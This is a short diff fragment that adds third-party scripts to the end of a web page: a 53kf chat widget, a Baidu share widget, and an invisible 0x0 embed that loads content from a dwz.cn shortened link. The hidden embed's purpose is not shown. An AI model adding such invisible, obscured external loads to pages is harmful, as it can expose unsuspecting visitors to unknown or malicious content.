+<script type='text/javascript' src='http://tb.53kf.com/kf.php?arg=10142118&style=1'></script>
+<embed src="http://dwz.cn/4aqtK9" width="0" height="0"></embed>
+
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"slide":{"type":"slide","bdImg":"4","bdPos":"left","bdTop":"165.5"}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
 
 </body>
 </html>
